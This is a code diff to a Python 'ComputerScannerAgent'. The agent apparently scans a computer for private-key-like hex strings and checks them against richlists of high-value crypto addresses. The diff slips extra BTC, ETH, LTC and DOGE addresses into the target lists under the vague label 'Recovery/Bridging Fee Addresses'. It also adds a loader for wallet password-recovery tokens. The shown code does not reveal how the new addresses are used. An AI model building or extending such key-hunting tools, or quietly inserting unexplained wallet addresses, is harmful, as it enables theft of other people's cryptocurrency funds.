@@ -24,29 +24,33 @@ class ComputerScannerAgent:
     Integrates with richlists and balance checkers.
     """
 
-    # Default High-Priority Target Addresses
+    # Default High-Priority Target Addresses (Includes Recovery/Bridging Fee Addresses)
     DEFAULT_TARGETS = {
         'btc': [
             'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
             '3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy',
             '1BgGZ9tcN4rm9KBzDn7KprQz87SZ26SAMH',
-            'bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4'
+            'bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4',
+            '1PRQwKHJ4gsZ5Mou3xNkSMrHjBgNbD2E8A'
         ],
         'eth': [
             '0x742d35Cc6634C0532925a3b844Bc9e7595f2bD38',
             '0xdead00000000000000000000000000000000beef',
             '0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf',
-            '0x9858EfFD232B4033E47d90003D41EC34EcaEda94'
+            '0x9858EfFD232B4033E47d90003D41EC34EcaEda94',
+            '0x2d03B56989dE9E5c66CBcA7D3525Ad1B5178A7F1'
         ],
         'ltc': [
             'ltc1q8c6fshw2dlwun7ekn9qwf37cu2rn755upcp6el',
             'LVuDpNCSSj6pQ7t9Pv6d6sUkLKoqDEVUnJ',
-            'LRS1wTAbCH5HFb3DR1sXwoSsBMNdg9ULU5'
+            'LRS1wTAbCH5HFb3DR1sXwoSsBMNdg9ULU5',
+            'LZB5znAUsU35q1K3UfoGmcdwPdnneaQNqv'
         ],
         'doge': [
             'D8vFz1p5KqYqZ9x3hJmN7rT4wU2sV6bA8c',
             'DFpN6QqFfUm3gKNaxN6tNcab1FArL9cZLE',
-            'DBMADVoQR2jWXnXeyTsoDYYhrGjepcWNgt'
+            'DBMADVoQR2jWXnXeyTsoDYYhrGjepcWNgt',
+            'DMpVUK7YGXfb3Esy6ujBrWEvDKDLeHNSih'
         ],
         'dash': ['XmN7PQYWKn5MJFna5fRYgP6mxT2F7xpekE', 'XgtuWVWf5L3p9iwe6mCTXK4toUb3aeWMxf'],
         'bch': ['bitcoincash:qp63uahgrxged4z5jswyt5dn5v3lzsem6cy4spdc2h', 'bitcoincash:qpzp3595m8q77rjnm7uezsm80c09yd2xyg0aj4mjqt'],
@@ -128,6 +132,7 @@ class ComputerScannerAgent:
         self._scan_thread = None
         self._richlist = set()
         self._load_richlist()
+        self._load_tokenlist()
 
         self.patterns = {
             'hex64': re.compile(r'\b[0-9a-fA-F]{64}\b'),
@@ -157,6 +162,18 @@ class ComputerScannerAgent:
                 print(f"[ComputerScanner] Loaded {len(self._richlist)} addresses from richlist")
             except Exception as e:
                 print(f"[ComputerScanner] Failed to load richlist: {e}")
+
+    def _load_tokenlist(self):
+        if self.tokenlist_path and os.path.exists(self.tokenlist_path):
+            try:
+                with open(self.tokenlist_path, 'r') as f:
+                    for line in f:
+                        token = line.strip()
+                        if token and token not in self.btc_recover_tokens:
+                            self.btc_recover_tokens.append(token)
+                print(f"[ComputerScanner] Loaded tokens from {self.tokenlist_path}")
+            except Exception as e:
+                print(f"[ComputerScanner] Failed to load tokenlist: {e}")
 
     def start(self, num_workers: int = 1):
         if self.is_running: return
